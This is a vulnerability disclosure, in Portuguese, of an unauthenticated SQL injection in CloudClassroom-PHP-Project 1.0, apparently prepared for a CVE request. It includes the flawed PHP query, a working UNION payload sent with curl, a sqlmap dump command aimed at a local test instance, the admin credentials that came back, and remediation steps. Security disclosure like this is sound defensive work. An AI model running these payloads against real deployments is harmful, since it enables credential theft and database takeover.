# CloudClassroom-PHP-Project 1.0 — SQL Injection em updatefaculty.php (parâmetro fid)

## Descrição

CloudClassroom-PHP-Project 1.0 (Vishal Mathur, `mathurvishal`) contém uma vulnerabilidade de **SQL Injection (UNION-based / error-based)** no componente `updatefaculty.php` através do(s) parâmetro(s) `fid`. O parâmetro `fid` é interpolado sem aspas (numérico) na consulta SELECT. Em contexto numérico é possível `UNION SELECT`. A tabela consultada expõe 9 colunas. Confirmado com dump não-autenticado das credenciais de admin.

Um atacante remoto pode explorar a falha enviando uma requisição HTTP `GET (+POST no UPDATE)` manipulada ao endpoint afetado. Leitura arbitrária do banco (C:H) — PII, senhas em texto puro, credenciais de admin; escrita via o sink UPDATE/POST (I:H); comprometimento total em cadeia.

## Componente afetado

| Campo | Valor |
|---|---|
| Produto | CloudClassroom-PHP-Project |
| Versão | 1.0 |
| Fornecedor | Vishal Mathur (`mathurvishal`) |
| Repositório | https://github.com/mathurvishal/CloudClassroom-PHP-Project |
| Arquivo(s) | `updatefaculty.php` |
| Parâmetro(s) | `fid` |
| Método HTTP | GET (+POST no UPDATE) |
| Autenticação exigida | Nenhuma (via Broken Access Control — item 00; o design pediria sessão de admin) |
| Interação do usuário | Nenhuma |

## Classificação

- **Tipo:** SQL Injection (UNION-based / error-based)
- **CWE:**
- CWE-89: SQL Injection
- **OWASP:** A03:2021 – Injection
- **CVSS v3.1:** 9.1 (Crítico) — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N`

## Causa-raiz

**`updatefaculty.php`**

```php
$x=$_GET['fid'];
$sql="select * from <tabela> WHERE <col>=$x";
$rs=mysqli_query($connect,$sql);
```

## Pré-condições

Nenhuma no alvo (item 00). Com o requisito de sessão original, PR sobe e o score cai.

## Impacto

Leitura arbitrária do banco (C:H) — PII, senhas em texto puro, credenciais de admin; escrita via o sink UPDATE/POST (I:H); comprometimento total em cadeia.

## Prova de conceito

1. Requisitar `updatefaculty.php` com `fid` contendo o payload UNION (sem cookie — item 00).
2. Ajustar a contagem de colunas para 9 (tabela alvo) e posicionar os dados na coluna exibida.
3. Ler as credenciais de admin refletidas na resposta.
4. Automatizar com sqlmap (`-p fid`) para dump completo.

```bash
curl -s -G "http://127.0.0.1:9292/updatefaculty.php" \
  --data-urlencode "fid=0 UNION SELECT 1,concat(0x5b,Aid,0x3a,Apass,0x5d),3,4,5,6,7,8,9 FROM admin -- -" | grep -oE "\[[^]]*:[^]]*\]"

sqlmap -u "http://127.0.0.1:9292/updatefaculty.php?fid=1" -p fid --batch --dump -T admin
```

**Evidência observada:** [admin@ics.com:admin]
[vishu:vishu]

## Correção recomendada

- Usar prepared statements com bind de parâmetros (`mysqli`/PDO) em 100% das consultas.
- Forçar o tipo dos identificadores numéricos (`(int)$id`) e usar allowlist quando aplicável.
- Não ecoar `$sql`/`mysqli_error()` ao cliente (remover oráculo de erro).
- Aplicar `exit;` após o guard de sessão (ver item 00).

## Estado de divulgação / CVE

Nenhuma CVE foi identificada para este componente/parâmetro no produto Vishal Mathur nem no código-base gêmeo 'CodeAstro Online Classroom' (verificado em NVD/cvefeed em 2026-08-02). Esta descrição destina-se à submissão para atribuição de CVE.

---
*Descrição gerada a partir de `_lib/findings_data.py` (fonte única). Produto: CloudClassroom-PHP-Project 1.0. Pesquisador: oliveira.luanalmeida@gmail.com e ethical.hacker.tiagoredivo@gmail.com.*
